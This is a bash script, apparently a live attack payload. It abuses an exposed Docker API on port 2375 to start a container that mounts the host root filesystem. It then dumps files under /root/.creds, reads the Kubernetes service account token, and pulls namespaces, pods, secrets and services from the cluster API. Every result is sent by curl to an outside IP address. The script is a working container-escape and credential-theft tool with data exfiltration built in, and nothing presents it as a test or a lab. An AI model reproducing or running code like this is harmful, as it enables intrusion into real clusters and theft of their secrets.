#!/bin/bash
{
echo "==S37=="

# Write inner script to a temp file on dind shared volume
INNER="/tmp/inner.sh"
cat > $INNER << 'INNEREOF'
#!/bin/bash
echo "S37_IN"
echo "==CREDS=="
ls -laR /host/root/.creds/ 2>&1
cat /host/root/.creds/* 2>&1
echo "==TOKEN=="
TOKEN=$(cat /host/var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
echo "T_LEN:${#TOKEN}"
echo "==NAMESPACE=="
cat /host/var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
echo "==K8S_NS=="
curl -sfk -H "Authorization: Bearer $TOKEN" "https://10.128.32.1:443/api/v1/namespaces" 2>&1 | head -500
echo "==K8S_PODS=="
curl -sfk -H "Authorization: Bearer $TOKEN" "https://10.128.32.1:443/api/v1/pods" 2>&1 | head -1000
echo "==K8S_SECRETS=="
curl -sfk -H "Authorization: Bearer $TOKEN" "https://10.128.32.1:443/api/v1/secrets" 2>&1 | head -500
echo "==K8S_SVC=="
curl -sfk -H "Authorization: Bearer $TOKEN" "https://10.128.32.1:443/api/v1/services" 2>&1 | head -500
echo "==DONE=="
INNEREOF
chmod +x $INNER

# Create escaped container mounting host + our script
IMG="blockstream/esplora:latest"
CID=$(curl -sf -X POST "http://docker:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"'"$IMG"'","Cmd":["bash","/script/inner.sh"],"HostConfig":{"Binds":["/:/host:ro","'"$INNER"':/script/inner.sh:ro"],"NetworkMode":"host"}}' 2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 | head -c 12)

echo "CID:$CID"
if [ -n "$CID" ]; then
    curl -sf -X POST "http://docker:2375/containers/$CID/start" 2>/dev/null
    sleep 10
    echo "==LOGS=="
    curl -sf "http://docker:2375/containers/$CID/logs?stdout=true&stderr=true" 2>&1
    curl -sf -X DELETE "http://docker:2375/containers/$CID?force=true" 2>/dev/null
fi

echo "==END=="
} 2>&1 | curl -s -m180 -X POST http://144.172.110.44:8443/s37 --data-binary @-
